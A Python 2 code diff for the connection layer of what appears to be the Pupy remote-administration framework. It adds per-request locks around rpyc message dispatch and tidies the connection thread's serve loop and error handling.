@@ -2,8 +2,8 @@
 
 import time
 
-from rpyc.core import Connection, consts
-from threading import Thread, Event, Lock
+from rpyc.core import Connection, consts, brine
+from threading import Thread, Event, Lock, RLock
 
 if __debug__:
     import logging
@@ -12,6 +12,7 @@ if __debug__:
 class PupyConnection(Connection):
     def __init__(self, lock, pupy_srv, *args, **kwargs):
         self._sync_events = {}
+        self._sync_locks = {}
         self._connection_serve_lock = lock
         self._async_lock = Lock()
         self._last_recv = time.time()
@@ -105,7 +106,10 @@ class PupyConnection(Connection):
         while not ( self._sync_events[seq].is_set() or self.closed ):
             if __debug__:
                 logger.debug('Sync poll until: {}'.format(seq))
-            if self._connection_serve_lock.acquire(False):
+
+            synclocked = self._sync_locks[seq].acquire(False)
+
+            if synclocked and self._connection_serve_lock.acquire(False):
                 data = None
 
                 try:
@@ -124,6 +128,7 @@ class PupyConnection(Connection):
                         if __debug__:
                             logger.debug('Sync poll serve interrupted: {}/inactive={}'.format(
                                 seq, self.inactive))
+
                         if self._ping:
                             if __debug__:
                                 logger.debug(
@@ -139,10 +144,14 @@ class PupyConnection(Connection):
                     if __debug__:
                         logger.debug('Sync poll serve complete. release: {}'.format(seq))
                     self._connection_serve_lock.release()
+                    self._sync_locks[seq].release()
 
                 self.dispatch(data)
 
             else:
+                if synclocked:
+                    self._sync_locks[seq].release()
+
                 if __debug__:
                     logger.debug('Sync poll wait: {}'.format(seq))
 
@@ -164,6 +173,9 @@ class PupyConnection(Connection):
 
         if seq in self._sync_events:
             del self._sync_events[seq]
+
+        if seq in self._sync_locks:
+            del self._sync_locks[seq]
 
         if self.closed:
             raise EOFError('Connection was closed, seq: {}'.format(seq))
@@ -187,6 +199,7 @@ class PupyConnection(Connection):
                 logger.debug('Sync request: {}'.format(seq))
 
             self._sync_events[seq] = Event()
+            self._sync_locks[seq] = RLock()
 
         self._send(consts.MSG_REQUEST, seq, (handler, self._box(args)))
 
@@ -285,7 +298,32 @@ class PupyConnection(Connection):
         now = time.time()
 
         if data:
-            self._dispatch(data)
+            msg, seq, args = brine.load(data)
+            if __debug__:
+                logger.debug('Processing message, seq: {} - started'.format(seq))
+
+            locked = False
+            if seq in self._sync_locks:
+                self._sync_locks[seq].acquire()
+                locked = True
+
+            try:
+                if msg == consts.MSG_REQUEST:
+                    self._dispatch_request(seq, args)
+                elif msg == consts.MSG_REPLY:
+                    self._dispatch_reply(seq, args)
+                elif msg == consts.MSG_EXCEPTION:
+                    self._dispatch_exception(seq, args)
+                else:
+                    raise ValueError("invalid message type: %r" % (msg,))
+
+            finally:
+                if locked:
+                    self._sync_locks[seq].release()
+
+            if __debug__:
+                logger.debug('Processing message, seq: {} - completed'.format(seq))
+
             self._last_ping = now
 
         with self._async_lock:
@@ -301,8 +339,9 @@ class PupyConnection(Connection):
 
 class PupyConnectionThread(Thread):
     def __init__(self, *args, **kwargs):
-        if hasattr(kwargs, 'lock'):
-            self.lock = getattr(kwargs, 'lock')
+
+        if 'lock' in kwargs:
+            self.lock = kwargs['lock']
             del kwargs['lock']
         else:
             self.lock = Lock()
@@ -310,6 +349,7 @@ class PupyConnectionThread(Thread):
         if __debug__:
             logger.debug('Create connection thread')
 
+        self.pupy_srv = args[0]
         self.connection = PupyConnection(self.lock, *args, **kwargs)
         self.Initialized = Event()
 
@@ -327,26 +367,39 @@ class PupyConnectionThread(Thread):
             logger.debug('Init connection')
 
         if not self.connection.initialize():
-            logger.debug('Initialization failed')
+            if __debug__:
+                logger.debug('Initialization failed')
+
             return
 
         if __debug__:
-            logger.debug('Init connection complete. Acquire lock')
+            logger.info('Start serve loop')
 
         if __debug__:
-            logger.debug('Start serve loop')
+            logger.debug('Bind payload, serve with interruptions')
 
-            with self.lock:
-                try:
-                    while not self.connection.closed:
-                        logger.debug('Connection thread loop. Inactive: {}'.format(
-                            self.connection.inactive))
+        try:
+            while not self.connection.closed:
+                if __debug__:
+                    logger.debug('Connection thread loop. Inactive: {}'.format(
+                        self.connection.inactive))
 
-                        data = self.connection.serve()
-                        self.connection.dispatch(data)
+                with self.lock:
+                    data = self.connection.serve()
 
-                except Exception, e:
-                    logger.exception(e)
+                self.connection.dispatch(data)
 
-                finally:
-                    self.connection.close()
+        except (EOFError, TypeError):
+            if __debug__:
+                logger.debug('Session closed'.format(
+                    self.connection.inactive))
+            pass
+
+        except Exception, e:
+            if __debug__:
+                logger.exception(e)
+
+            pass
+
+        finally:
+            self.connection.close()
